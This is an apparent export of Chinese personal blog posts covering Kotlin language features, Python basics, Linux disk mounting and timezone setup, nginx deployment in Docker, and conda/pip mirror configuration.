private&#x2F;protected&#x2F;internal&#x2F;public3.1 这4个修饰符为可见性修饰符。(1) 如果用 private 修饰，那么只能在这个类的内部(包含其所有成员)可见；(2) 如果用 protected 修饰，不但可以在类内部可见，在子类中也可见；(3) 如果用 internal 修饰，则类声明的本模块内的客户端都可见(模块的概念同 Java 中包的概念)；(4) 如果用 public 修饰，则任何地方可见。在 Kotlin 中，如果没有显示指定 private&#x2F;protected&#x2F;internal&#x2F;public 这几个修饰符，那么默认是 public。


这就是java和kotlin的一个区别，因此想要实现和java一样的某些功能，我们得使用protected来实现。而不能使用private
]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin细节（1）if表达式</title>
    <url>/posts/4a01cb33/</url>
    <content><![CDATA[
在kotlin中，if是表达式，而不是语句。他们的区别是表达式有值，可以作为另一个表达式的一部分使用。而语句没有。
而另一方面，在java中赋值操作是表达式，所以你可以在很多的if判断中看到赋值的出现，而kotlin中赋值操作变成了语句，这样有助于避免比较和赋值的混淆

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin高级函数和lambda表达式</title>
    <url>/posts/ffe74f54/</url>
    <content><![CDATA[
kotlin的表达式函数体
 fun main() &#123;	println(add_express(1, 2))	println(add_block(1, 2))	println(add_lambda(1, 2))&#125;/** * 代码块体，最完整的函数体 */fun add_block(a: Int, b: Int): Int &#123;	return a + b&#125;/** * 表达式体 * 要求，他的函数体是由单个表达式构成的。 * 那么她会自动判断返回类型。可以省略掉返回类型，同时需要省略掉花括号和return */fun add_express(a: Int, b: Int) = a + bvar add_lambda = &#123; a: Int, b: Int -&gt; a+b&#125;fun add(a:Int,b:Int):(Int,Int)-&gt;(Int)=&#123; a: Int, b: Int -&gt; a+b&#125;

kotlin高阶函数一个函数如果参数类型是函数或者返回值类型是函数，那么这就是一个高阶函数。函数类型其实就是将函数的 “参数类型” 和 “返回值类型” 抽象出来例如:
fun add():(Int,Int)-&gt;(Int)=&#123; a: Int, b: Int -&gt; a+b&#125;
这里表示他的返回类型为(Int,Int)-&gt;(Int)

Lambda表达式同样的在lambda表达式中,他的函数体也只有一个表达式。他是定义匿名函数的简单形式
val sum = &#123;x:Int,y:Int -&gt; x+y&#125;
其中，参数声明放在-&gt;前面，函数体放在-&gt;后面还可以将可选标注先留下
val sum:(Int,Int)-&gt;Int = &#123;x,y-&gt;x+y&#125;
在kotlin中，如果一个函数的最后一个参数是lambda表达式，那么可以直接将表达式写在括号外面。如果只有一个参数，那么直接省略小括号。

特殊符号


?表示  是否允许空值的存在!!表示  如果对象为null，那么系统一定会报异常！?:表示  对象A ?: 对象B 表达式，意思为，当对象 A值为 null 时，那么它就会返回后面的对象 B。::表示  Kotlin 中 双冒号操作符 表示把一个方法当做一个参数，传递到另一个方法中进行使用，通俗的来讲就是引用一个方法。-&gt;表示 一般用于函数类型的连接符号===和==的区别 在Kotlin中，&#x3D;&#x3D;&#x3D; 表示比较对象地址，&#x3D;&#x3D; 表示比较两个值大小。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin默认参数没在源代码中定义</title>
    <url>/posts/ab0b4c11/</url>
    <content><![CDATA[在使用kotlin协程时，突然发现一个无法理解的语法。在下图中，是runBlocking的源代码可以发现，他需要接受两个参数，第一个是context，第二个则是我们自己的lambda函数。而实际上，我们并没用传入第一个参数进去，他却可以正常的运行而不报错。他也并没有默认的参数。
解释首先我们要理解的是kotlin是个多平台支持的语言。因此他在实现某些功能时，需要兼容win，linux，java等多平台。例如：我们正在使用的协程库，肯定是一个多平台库。
expect actualKotlin中的expect和actual是一对关键字，用于实现跨平台的编程，特别是在编写多平台库（Commons Kt）时。在这种情况下，我们需要在一个公共的Kotlin文件中定义接口和类，而实现则需要针对不同的平台进行特殊处理，因为不同平台的操作系统和硬件配置有所不同。
expect和actual关键字是为了解决这种情况而设计的。expect用于声明一个接口或类，以及其所需要的属性和方法；而actual则用于提供这个接口或类的实际实现。这种技术可以让我们以一种抽象的方式编写代码，而不用关心它在不同平台上的实现细节。
例如，在Commons Kt中，我们可能需要实现一个网络请求的框架。在这种情况下，我们可以使用expect来定义一个接口：
expect interface HttpClient &#123;    fun get(url: String): String    fun post(url: String, data: String): String&#125;
接下来，在各个平台的特定实现中，我们可以使用actual关键字提供具体的实现：
actual class HttpClientImpl : HttpClient &#123;    override fun get(url: String): String &#123;        // 在Android平台上使用OkHttp来实现        // 在iOS平台上使用NSURLSession来实现    &#125;    override fun post(url: String, data: String): String &#123;        // 实现与get()方法类似    &#125;&#125;]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>expect actual</tag>
      </tags>
  </entry>
  <entry>
    <title>kotlin（Java函数式API的使用）</title>
    <url>/posts/c7d683d3/</url>
    <content><![CDATA[Java函数式API的使用public interface OnClickListener&#123;	void onClick(View v);&#125;
这种接口被称为函数式接口，或者 SAM 接口， SAM 代表单抽象方法。
使用函数式接口的前体这里的前提是，使用kotlin去调用java方法，而且java方法是个单抽象接口方法，就可以直接使用函数式API。已知在kotlin中，有很多简单快捷的函数式API操作。例如：
val list = listOf(&quot;Apple&quot;,&quot;Banana&quot;,&quot;Orange&quot;,&quot;Grape&quot;,&quot;Watermelon&quot;)val maxLengthFruit = list.maxBy&#123;it.length&#125;println(maxLengthFruit)
而这个的前提就是kotlin中可以将函数作为一个参数传递出去。同样也可以使用lambda来简写函数式。我们在这里说的是，如果JAVA是一个单抽象接口方法，我们在kotlin中调用该方法时，也可以很简单的去编写，例如下面
//这是一个Android中常用的点击事件窗口。public interface OnClickListener&#123;	void onClick(View v);&#125;//如果通过JAVA的方式编写//在以下函数中，View中的一个内部接口OnClickListener被当场实现。并且重写方法button.setOnClickListener(new View.OnClickListener()&#123;	@Override	public void onClick(View w)&#123;	//方法体	&#125;&#125;);//而通过kotlin调用JAVA的话button.setOnClickListener&#123;	//方法体&#125;


可能你会疑惑，既然使用了kotin那么调用java应该不常用吧，但实际并不是这样，kotlin的核心之一就是与java的互操性，它可以在几乎所有地方，平等的替代java，因此也可以使用java巨大的生态库，这样使用java的函数式API的机会就会有很多。

！！！只有在kotlin调用java时才可以使用

详解函数式接口在kotlin中的使用在java中的期望函数式接口的方法可以接受一个lambda函数作为实参。同样能达到该效果的还可以用object显示继承该接口，并重写他的方法。
但是如果用object显示创建的话，他会每一次都创建一个使用新实例对象。而如果使用lambda的话，如果该lambda函数没有访问任何定义他的函数的局部变量，也就是没有访问外部变量，那么这个lambda函数就是可以在多次调用中重用的。如果他访问了外部变量，那么每次也会去创建一个新实例作为参数传递进去。使用lambda函数是因为他在底层为你完善了这个SAM实例。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin（类型系统）</title>
    <url>/posts/39b5aa7e/</url>
    <content><![CDATA[可空性
在java中，运行一个程序，往往遇到的最多的错误就是空指针异常，而空指针异常他是个运行时异常，往往不会指明究竟是哪一行的问题，这就让程序员非常的头疼。

而kotlin的解决方案就是把运行时错误转为编译期的错误。让程序员可以在编译时就减少错误异常的产生。通过区分可空和非空两种数据类型。
可空类型在kotlin中，所有的常见类型都是默认非空的，也就是不能接受null作为参数。除非显示的把他标记为可空，即在类型后面加上?。但是，一旦声明了是可控类型，就会有很多操作受到限制，kotlin会直接拒接一部分函数的调用，除非你对他进行了非空判断处理，然后kotlin系统就会只能判断类别，然后你才能继续执行。例如：
fun strLen(s:String?) = if(s!=null) s.length else 0
如果你不进行非空判断，他将不允许进行编译。
类型定义
类型就是数据的分类……决定了该类型可能的值，以及该类型的值上可以完成的操作。

在java中，他没有区分可空和非空，例如String类型可以接受String类型和null。而这在运行中就有可能导致空指针异常（NullPointerException）。而如果每次调用前都进行一次非空判断，就会大大降低代码的可读性。致使代码臃肿。

java中也提供了@Nullable和@NotNull的注解用来判断能否处理空值。或者直接使用Optional的一种包装类，用来确保没有null，但是这会导致代码变得冗余，额外的包装类还会影响运行时的性能。

Kotlin的可空类型提供了全面的解决方案。区分可空和非空类型使判断变得简单。
安全调用运算符：？.kotlin工具库中最有效的一种工具就是安全调用运算符：?.他允许你把一次null检查和一次方法调用合并成一个操作。
不只是可以调用方法，调用属性也是一样的，可以把检查过程和方法调用一起执行。
Elvs运算符：” ?: “他可以方便的提供代替null的默认值，被称为Elvs运算符。他常常和安全调用运算符一起使用，用一个值代替对null对象调用方法时返回的null。
fun strLen(s:String?) = s?.length ?: 0
Elvs的特殊用处，return和throw都是表达式，也就是说Elvs运算符也可以接return和throw。那么如果左边判断出为空，可以直接返回或者抛出异常。这个使用情况总是特别有用。
安全转化：” as? “这个也很好理解，as就和类型转化符，如果检测到类型不匹配，将会返回一个空值。他也经常和Evls运算符一起使用。比如，重写Equals方法时：
class Person&#123;    override fun equals(o:Any?):Boolean&#123;        val other = o as? Person ?: return false    &#125;&#125;
非空断言：” !! “就是强制确保该类型一定不是null，尽管他是可空类型。如果他是null的话，将会抛出一个异常表明这个断言出现了问题，但是kotlin与java不一样的就是他会表明具体那个位置出现了问题，而不是单纯的报一个空指针异常。通常不建议使用非空断言，因为他会凌驾于编译器之上，无法替你解决空值问题。
let函数let函数本身没什么特点，他的作用是把一个调用他的对象变成lambda表达式的参数。但是如果结合安全调用运算符一起使用的话，他就可以很好的解决在预判非空后实现内容。而且如果一个表达式会返回一个对象，一般需要将该对象用一个变量存储，然后再使用该变量进行非空判断再执行操作。而let可以直接把这个表达式的对象进行非空判断后传入到lambda函数中作为参数使用。减少了内存的消耗。
延迟初始化的属性他的作用场景就是，一个变量最终一定是非空的，但是在初始化化时，不知道给他传入什么非空值。而如果传入null，将会导致后期大量的非空判断处理。影响效率。因此可以延迟初始化。他常常与一些框架中的依赖注入相互配合使用。为了保证框架的兼容性，kotlin会默认生成一个lateinit的属性的具有相同可见性的字段。
可空类型的扩展对于可空类型数据的扩展函数。可以不通过安全检测就直接调用，例如：
fun String?. isNullOrBlank () : Boolean = this == null 11 this.isBlank ()

泛型类和泛型函数都是默认可空的，他们都允许null的存在，即使T没有用？结尾，如果要限制非空，需要让泛型继承自Any，即非空泛型。

可空性和java在java中可以通过注解实现和kotlin类似的效果。并且可以和kotlin的非空与空相互编译成功。

因为

平台类型本质上就是kotlin无法判断的可空性的类型。他即可当作可空又可当作非可空通过kotlin调用java时，一样需要满足相关的安全性判断，否则可能会抛出参数异常的报错kotlin可以根据平台类型去多种方式的执行，继承相关的java代码。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>kotlin（object)</title>
    <url>/posts/5eb8f30/</url>
    <content><![CDATA[Object单例模式在kotlin中，可以非常简单的通过这个关键词实现一个单例类。他可以实现接口，继承类，也可以用扩展方法去扩展类。他就是一个非常完美的类的声明方法。

当然，同理的作为一个单例类，他并没有构造方法，也就是如果你使用constructor将会直接导致报错。

如果在java中要调用kotlin中的object对象，他需要通过一个字段INSTANCE来实现，具体实例如下
//kotlinopen class Student:Child&#123;    fun call()&#123;        println(&quot;我会叫&quot;)    &#125;&#125;object child1:Student()&#123;    val name=&quot;abc&quot;&#125;//javapublic class Test &#123;    public static void main(String[] args) &#123;        child1.INSTANCE.walk();        System.out.println(child1.INSTANCE.getName());    &#125;&#125;
然后实现结果为-2023-07-12-09-18.png)乱码暂时不晓得怎么解决。
伴生对象kotlin并没有静态方法的称谓。所以使用伴生对象。他在大多数情况下可以用来代替java中的static方法。虽然推荐静态方法使用顶层函数，因为他在编译后会直接编译为static类型。但是某些时候不允许这样操作，比如一个类中的私有类无法通过顶层函数访问到。-2023-07-14-42-18.png)
class A&#123;    companion object&#123;        var filed = &quot;字母&quot;        fun call()&#123;            print(filed)        &#125;    &#125;&#125;
声明伴生对象需要使用companion的关键字，他被声明后，可以通过类名直接使用伴生对象中的方法和属性，而不用创建实例。也可以通过类名调用Companion伴生对象然后实现。本质是一样的，例如：
A.call()A.Companion.call()
他们实际是一样的操作。
工厂模式工厂模式下，会将类的构造器私有化，不允许通过构造器去实现创造实例。而是通过在伴生对象中，通过定义不同含义名字的各种方法，来实现生成实例类。而且伴生对象不能被继承和重写。
作为一个普通对象的伴生对象，他甚至还可以定义伴生对象的名字，就像实现单例类那用。然后可以通过他的类名和他的伴生对象名去调用这个伴生对象。

如果要使用java去调用kotlin中的伴生类，一定需要通过他的默认名称Companion或者伴生对象名去调用该方法。 或者使用注解@JvmStatic将方法声明为静态方法，用@JvmFiele将属性声明为静态属性。这样的话，java可以直接调用，而不用先调用该伴生对象。

匿名内部类使用object作为匿名内部类，很好理解。就不再多言。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>linux下硬盘挂载和分区</title>
    <url>/posts/acfcb58e/</url>
    <content><![CDATA[初始化硬盘并挂载
执行fdisk -l查看硬盘信息

执行以下命令，对 &#x2F;dev&#x2F;vdb 裸设备直接创建文件系统格式。mkfs -t &lt;文件系统格式&gt; /dev/vdb

不同文件系统支持的分区大小不同，请根据实际需求合理选择文件系统。以设置文件系统为 EXT4 为mkfs -t ext4 /dev/vdb

执行以下命令，新建挂载点。mkdir &lt;挂载点&gt; 以新建挂载点 &#x2F;data 为例：mkdir /data

执行以下命令，将新建分区挂载至新建的挂载点。mount /dev/vdb &lt;挂载点&gt;

以新建挂载点 &#x2F;data 为例：mount /dev/vdb /data

执行以下命令，查看挂载结果。df -TH


开机自动挂载
执行以下命令，查看文件系统的 UUID。blkid /dev/vdb

执行以下命令，使用 VI 编辑器打开 /etc/fstab 文件。vi /etc/fstab

在 /etc/fstab 文件中添加以下内容。
 &lt;设备信息&gt; &lt;挂载点&gt; &lt;文件系统格式&gt; &lt;文件系统安装选项&gt; &lt;文件系统转储频率&gt; &lt;启动时的文件系统检查顺序&gt;

 以使用磁盘分区的 UUID 自动挂载为例，结合前文示例则添加：
 UUID=d489ca1c-5057-4536-81cb-ceb2847f9954 /data  ext4 defaults     0   0

]]></content>
      <tags>
        <tag>linux</tag>
        <tag>硬盘</tag>
      </tags>
  </entry>
  <entry>
    <title>kotlin（序列）</title>
    <url>/posts/58cbed9c/</url>
    <content><![CDATA[序列引出序列的使用，首先当我们在使用集合的各种便携式API函数时，他会创建一个中间列表，最后返回。这在使用中并没有什么问题，但是如果采用了链式的多个函数操作，以及集合的基数很大时就会导致效率低下。例如这个，他会在中途生成两个列表，如果基数很大将会变得非常低效。
people.map(Person: :name) .filter &#123; it.startsWith （&quot;A&quot;）｝
而序列就是一种惰性集合，他一样可以使用集合所有的api方法，但是他不会在中间创造集合存储，而是类似java中的流。他是一个迭代器的形式，每个元素每个元素的遍历，然后最后在生成结果，如果没有最后的生成结果的步骤，他不会进行之前的操作。
Sequence接口惰性集合的接口就是Sequence接口，而且他只提供了一个方法，也就是iterator。因为Sequence是惰性的，所以他可以很高效的对集合元素执行链式操作，而且不会产生额外的中间集合。
序列操作序列操作有两种，一种中间操作，他返回的任然是序列，一种是末端操作，他返回的结果，可以是任何所需要的对象。中间操作始终是惰性的 ，也就是意味着，在链式操作中。如果是一般的集合，那么他们会先把所有元素都进行第一次中间操作，得到一个新集合，再进行第二次中间操作。而这就会带来内存的消耗。如果是惰性集合即序列时，他会按顺序把每个元素进行完所有的中间操作，然后返回。接下来再执行第二个元素。依次递进。
而且即便都是序列，不同的执行顺序也会有不同的性能开销。
生成Sequence第一种生成Sequence的方式就是通过集合的asSequence()方法，第二种就是调用generateSequence()，给定序列的前一个元素，他就会根据函数推导出第二个函数。
fun main() &#123;    val testSequence = generateSequence(1)&#123;it*2&#125;    val result = testSequence.takeWhile &#123; it&lt;=1024 &#125;    //延期操作    println(result.sum())        //迭代器的使用    var a = result.iterator()    for(i in a)&#123;        println(i)    &#125;&#125;
结果如下：需要注意的是testSequence和result都是延期操作的序列，只有实际被调用，使用后才会进行求值。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>linux使用docker部署nginx</title>
    <url>/posts/277595ec/</url>
    <content><![CDATA[安装nginxdocker pull nginx
绑定端口和映射路径docker run -d -p 80:80 -p 81:81 -p 82:82 --name nginx\  -v /root/nginx/nginx.conf:/etc/nginx/nginx.conf \  -v /root/nginx/conf.d:/etc/nginx/conf.d \  -v /root/nginx/logs:/var/log/nginx \  -v /root/nginx/html:/usr/share/nginx/html \  -v /root/nginx/ssl:/etc/nginx/ssl \  nginx

nginx配置模板nginx.conf配置选项user www-data;worker_processes auto;pid /run/nginx.pid;include /etc/nginx/modules-enabled/*.conf;events &#123;        worker_connections 768;        # multi_accept on;&#125;http &#123;        ##        # Basic Settings        ##        sendfile on;        tcp_nopush on;        tcp_nodelay on;        keepalive_timeout 65;        types_hash_max_size 2048;        # server_tokens off;        # server_names_hash_bucket_size 64;        # server_name_in_redirect off;        include /etc/nginx/mime.types;        default_type application/octet-stream;        ##        # SSL Settings        ##        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE        ssl_prefer_server_ciphers on;        ##        # Logging Settings        ##        access_log /var/log/nginx/access.log;        error_log /var/log/nginx/error.log;        ##        # Gzip Settings        ##        gzip on;        # gzip_vary on;        # gzip_proxied any;        # gzip_comp_level 6;        # gzip_buffers 16 8k;        # gzip_http_version 1.1;        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;        ##        # Virtual Host Configs        ##        include /etc/nginx/conf.d/*.conf;        include /etc/nginx/sites-enabled/*;        include /etc/nginx/conf.d/**/*.conf;        #test_3d&#125;#mail &#123;#       # See sample authentication script at:#       # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript# #       # auth_http localhost/auth.php;#       # pop3_capabilities &quot;TOP&quot; &quot;USER&quot;;#       # imap_capabilities &quot;IMAP4rev1&quot; &quot;UIDPLUS&quot;;# #       server &#123;#               listen     localhost:110;#               protocol   pop3;#               proxy      on;#       &#125;# #       server &#123;#               listen     localhost:143;#               protocol   imap;#               proxy      on;#       &#125;#&#125;

conf.d下的文件配置模板
反向代理其他端口的服务
  server &#123;        listen 80;        server_name zfxt.top;        add_header Strict-Transport-Security max-age=15768000;        return 301 https://$server_name$request_uri;        location / &#123;            # 单个服务            proxy_pass http://127.0.0.1:5244/;            # 负载均衡            # proxy_pass http://yourServers/;            proxy_redirect off;            proxy_set_header        X-Real-IP           $remote_addr;            proxy_set_header        X-Forwarded-For     $proxy_add_x_forwarded_for;            proxy_set_header        Host                $http_host;            proxy_set_header        X-NginX-Proxy       true;        &#125;    &#125;server &#123;        listen 443 ssl;        server_name zfxt.top;        # 下面ssl开头的是HTTPS相关的设置        ssl on;        ssl_certificate          /root/.acme.sh/*.zfxt.top_ecc/fullchain.cer;        ssl_certificate_key     /root/.acme.sh/*.zfxt.top_ecc/*.zfxt.top.key;        ssl_session_timeout     3600m;#session有效期，根据需要适当延长        ssl_session_cache       shared:SSL:10m;        # 使用的加解密方式        ssl_ciphers             ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;        # 支持的协议类型        ssl_protocols             TLSv1 TLSv1.1 TLSv1.2;        # 优先使用服务端的加解密方式        ssl_prefer_server_ciphers on;             location / &#123;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_set_header X-Forwarded-Proto $scheme;        proxy_set_header Host $http_host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header Range $http_range;        proxy_set_header If-Range $http_if_range;        proxy_redirect off;        proxy_pass http://127.0.0.1:5244;        # the max size of file to upload        client_max_body_size 20000m;        &#125;    &#125;

或者直接启动前端服务
  server &#123;        listen       80;        server_name  zfxt.top;        rewrite ^(.*)$ https://$host$1 permanent;        #charset koi8-r;        #access_log  logs/host.access.log  main;        location   / &#123;            root html;                index index.html;        &#125;&#125;server &#123;        listen       443 ssl;        server_name  zfxt.top;        ssl on;        ssl_certificate         /root/.acme.sh/zfxt.top_ecc/fullchain.cer;        ssl_certificate_key     /root/.acme.sh/zfxt.top_ecc/zfxt.top.key;        ssl_session_timeout     3600m;#session有效期，根据需要适当延长        ssl_session_cache       shared:SSL:10m;        root /etc/nginx/conf.d/typecho;        index index.php;        ssl_ciphers             ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;        ssl_protocols             TLSv1 TLSv1.1 TLSv1.2;        ssl_prefer_server_ciphers  on;        #typecho        location ~ .*\.php(\/.*)*$ &#123;                root           /etc/nginx/conf.d/typecho/;        fastcgi_split_path_info ^(.+?.php)(/.*)$;                fastcgi_pass  127.0.0.1:9000;                fastcgi_index  index.php;                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;                include        fastcgi_params;        &#125;        #location / &#123;        #root /etc/nginx/conf.d/typecho;        #index  index.html index.php;        #&#125;        location /sentence &#123;                proxy_pass http://localhost:8080/api/sentence;        &#125;    &#125;

]]></content>
  </entry>
  <entry>
    <title>linux修改时区</title>
    <url>/posts/5ad2f02/</url>
    <content><![CDATA[Linux 设置时区和修改时间timedatectl set-timezone Asia/Shanghai     #服务器时区设置date #查看时间date -s &quot;2024-07-17 09:28:05&quot;              #修改时间

保存退出，然后reboot重启服务器即可生效，date命令查看是24小时时间格式。
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux分区方案</title>
    <url>/posts/eb50fec0/</url>
    <content><![CDATA[常用方案
分为3个区

挂载点&#x2F;；主分区；安装系统和软件；大小为30G；分区格式为ext4；

挂载点&#x2F;home；逻辑分区；相当于“我的文档”；大小为硬盘剩下的; 分区格式ext4；

swap；逻辑分区；充当虚拟内存；大小等于内存大小或内存的一半（本人16G）；分区格式为swap

&#x2F;boot ；引导分区；逻辑分区； 大小为1G ；分区格式为ext4；


]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux换源须知</title>
    <url>/posts/f74b10c2/</url>
    <content><![CDATA[这里只说明ubuntu，其他的linux应该也是一通百通的。每个发行版本都有自己的代号。也就是说，我们平常直接在网上复制的换源代码不一定适用，还可能导致系统崩溃类似这样子，因此我们每次换源时，需要考虑到他的版本代号。这里直接推荐最终解决方案。https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>ubuntu换源</tag>
      </tags>
  </entry>
  <entry>
    <title>python简单学习</title>
    <url>/posts/94a5acd6/</url>
    <content><![CDATA[# 第一个字符必须为字母或者_# 大小写敏感_a = 1a = 2&#x27;&#x27;&#x27;多行注释&#x27;&#x27;&#x27;print(_a, a)# 行与缩进if a == 2:    print(&quot;a == 2&quot;)&#x27;&#x27;&#x27;Number类型：int 1,bool true,float 1.23,complex 1.1+2j字符串 变量[头下标:尾下标:步长] 来截取字符串字符串可以用 + 运算符连接在一起，用 * 运算符重复。反斜杠可以用来转义，使用 r 可以让反斜杠不发生转义。 如 r&quot;this is a line with \n&quot; 则 \n 会显示，并不是换行。&#x27;&#x27;&#x27;print(type(a))input(&quot;\n\n按下enter键退出&quot;)# Python 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。# 允许多变量赋值,指定赋值x = y = z = 1a, b, c = 1, 2, 3&#x27;&#x27;&#x27;Number（数字）String（字符串）bool（布尔类型）List（列表）Tuple（元组）Set（集合）Dictionary（字典）不可变数据（3 个）：Number（数字）、String（字符串）、Tuple（元组）；可变数据（3 个）：List（列表）、Dictionary（字典）、Set（集合）。 &#x27;&#x27;&#x27;&#x27;&#x27;&#x27;type()不会认为子类是一种父类类型。isinstance()会认为子类是一种父类类型。&#x27;&#x27;&#x27;a = 111print(isinstance(a, str))print(type(a))# 注意：Python3 中，bool 是 int 的子类，True 和 False 可以和数字相加， True==1、False==0# del语句删除一些对象引用。del astr = &#x27;Runoob&#x27;# 索引值以 0 为开始值，-1 为从末尾的开始位置。print(str[0:-1])# int() 强制转换为整型：x = int(2.6)print(x)# while 循环使用 else 语句count = 0while count &lt; 5:    print(count, &quot; 小于 5&quot;)    count = count + 1else:    print(count, &quot; 大于或等于 5&quot;)# Python pass是空语句，是为了保持程序结构的完整性。&#x27;&#x27;&#x27;列表推导式[表达式 for 变量 in 列表] [out_exp_res for out_exp in input_list]或者 [表达式 for 变量 in 列表 if 条件][out_exp_res for out_exp in input_list if condition]&#x27;&#x27;&#x27;names = [&#x27;Bob&#x27;, &#x27;Tom&#x27;, &#x27;alice&#x27;, &#x27;Jerry&#x27;, &#x27;Wendy&#x27;, &#x27;Smith&#x27;]new_names = [name.upper() for name in names if len(name) &gt; 3]print(new_names)# 元组推导式（生成器表达式）a = (x for x in range(1,10))# a &lt;generator object &lt;genexpr&gt; at 0x7faf6ee20a50&gt;# 返回的是生成器对象tuple(a) #  使用 tuple() 函数，可以直接将生成器对象转换成元组# (1, 2, 3, 4, 5, 6, 7, 8, 9)&#x27;&#x27;&#x27;创建一个迭代器把一个类作为一个迭代器使用需要在类中实现两个方法 __iter__() 与 __next__() 。&#x27;&#x27;&#x27;class MyNumbers:    def __iter__(self):        self.a = 1        return self    def __next__(self):        x = self.a        self.a += 1        return xmyclass = MyNumbers()myiter = iter(myclass)print(next(myiter))print(next(myiter))# 生成器&#x27;&#x27;&#x27;当在生成器函数中使用 yield 语句时，函数的执行将会暂停，并将 yield 后面的表达式作为当前迭代的值返回。然后，每次调用生成器的 next() 方法或使用 for 循环进行迭代时，函数会从上次暂停的地方继续执行，直到再次遇到 yield 语句。这样，生成器函数可以逐步产生值，而不需要一次性计算并返回所有结果。调用一个生成器函数，返回的是一个迭代器对象。&#x27;&#x27;&#x27;def countdown(n):    while n &gt; 0:        yield n        n -= 1# 创建生成器对象generator = countdown(5)# 通过迭代生成器获取值print(next(generator))  # 输出: 5print(next(generator))  # 输出: 4print(next(generator))  # 输出: 3# 使用 for 循环迭代生成器for value in generator:    print(value)  # 输出: 2 1# lambda arguments: expressionx = lambda a, b, c : a + b + cprint(x(5, 6, 2))&#x27;&#x27;&#x27;__name__属性一个模块被另一个程序第一次引入时，其主程序将运行。如果我们想在模块被引入时，模块中的某一程序块不执行，我们可以用__name__属性来使该程序块仅在该模块自身运行时执行。 &#x27;&#x27;&#x27;#!/usr/bin/python3# Filename: using_name.pyif __name__ == &#x27;__main__&#x27;:   print(&#x27;程序自身在运行&#x27;)else:   print(&#x27;我来自另一模块&#x27;)# 内置的函数 dir() 可以找到模块内定义的所有名称。以一个字符串列表的形式返回:]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python入门</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx 部署前后端错误记录</title>
    <url>/posts/bfeba94/</url>
    <content><![CDATA[记录两个错误1在我部署了一个前端页面到服务器上的nginx后，我访问他报错403.显示没有权限。后来发现403的一个可能原因是因为nginx没有权限访问到&#x2F;root中的内容。因为我把vue打包的页面直接放到了root目录下。因此报错，只要将这个dist文件放到其他位置即可正常访问了
2vue部署了路由的话，再部署到nginx上需要为vue的路由专门配置
location / &#123;               root html/dist;               index index.html;               try_files $uri $uri/ /index.html;#解决页面刷新       &#125;
同时因为vue的代理服务器只在运行时才有用。因此需要再nginx部署代理服务器。或者再后端解决跨域问题。这里介绍再nginx解决代理的方法。
location  /api/ &#123;            # 单个服务            proxy_pass http://127.0.0.1:5441/;            # rewrite ^(.*)api(.*)$ $1$2 last;            # 负载均衡            # proxy_pass http://yourServers/;           proxy_redirect off;           proxy_set_header        X-Real-IP           $remote_addr;           proxy_set_header        X-Forwarded-For     $proxy_add_x_forwarded_for;           proxy_set_header        Host                $http_host;           proxy_set_header        X-NginX-Proxy       true;        &#125;
你不需要再重写请求路径了，他接收到&#x2F;api的请求路径时，会自动的转移到proxy_pass并且自动去掉api。
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>pytorch和jupyter的安装</title>
    <url>/posts/c0b02993/</url>
    <content><![CDATA[
第一步，欲要使用python最佳的建议是使用conda实现python的环境管理，因此这里演示conda的安装和使用。注意，接下来的所有内容都推荐关闭代理进行使用。避免出现网络不通畅的情况。还有conda在安装时会修改dll文件。如果有安装360或者其他杀毒软件的话。需要给予白名单或者关闭杀毒程序
anaconda作为python的版本管理神器，但由于他的体积太大，安装后大概占约2G左右的空间，因此这里推荐使用miniconda。



下载安装conda由于官网下载太慢，因此推荐去(清华大学开源软件镜像站下载)[https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/?C=M&amp;O=D]
修改conda源安装后，需要进行换源，不然下载，导包都会异常缓慢。

conda配置文件位置：~&#x2F;.condarc (Windows路径为：C:\Users.condarc)
清华源配置，通常配置写入标准库的内容即可，若要使用附加库的内容才将其插入“ - defaults”那一行前面：channels:  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/menpo/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/  - defaultsshow_channel_urls: true

修改pip源
pip配置文件位置：~&#x2F;.pip&#x2F;pip.conf (Windows路径为：C:\Users\pip\pip.ini)
阿里源配置：[global]index-url = https://mirrors.aliyun.com/pypi/simple/trusted-host=mirrors.aliyun.comtimeout = 120

